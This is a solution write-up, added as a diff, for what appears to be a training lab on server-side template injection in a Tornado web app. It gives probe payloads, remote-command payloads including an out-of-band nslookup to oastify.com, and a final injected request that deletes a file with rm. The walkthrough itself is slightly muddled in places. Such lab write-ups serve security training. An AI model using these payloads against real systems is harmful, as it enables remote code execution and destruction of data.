@@ -1,0 +1,53 @@
+// Lab: Basic server-side template injection (code context)
+
+
+This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+
+// Solution
+
+
+// Tornado
+
+Tornado - Basic Injection
+
+{{7*7}}
+{{7*'7'}}
+
+
+// Tornado - Remote Command Execution
+
+{{os.system('whoami')}}
+{%import os%}{{os.system('nslookup oastify.com')}}
+
+
+
+// Steps to solve
+
+
+1. Login as the given credentials as wiener:peter.
+
+
+2. There we see the preferred name change it to first_name and Intercept the request, the request look like POST /my-account/change-blog-post-author-display and send it to Repeater. 
+
+
+3. Now go to the blog page and comment down anything.
+
+
+4. Come back to Repeater and in the bottom change the given blog-post-author parameter blog-post-author-display={{user.first_name}} to 
+blog-post-author-display=7*7
+
+
+5. Now check the comment again and you will see the name peter is look like 49 which is the evaluation of 7*7
+
+
+6. Now for delete the morale.txt file we need to use the Tornado - Remote Command Execution code given below:
+
+blog-post-author-display={{user.first_name}}{% import os %}
+{{os.system('rm /home/carlos/morale.txt')}}&csrf=X4q7dfoLttNvnCZFYxCfKOAe0pmfJlu5
+
+
+7. The lab will be solved
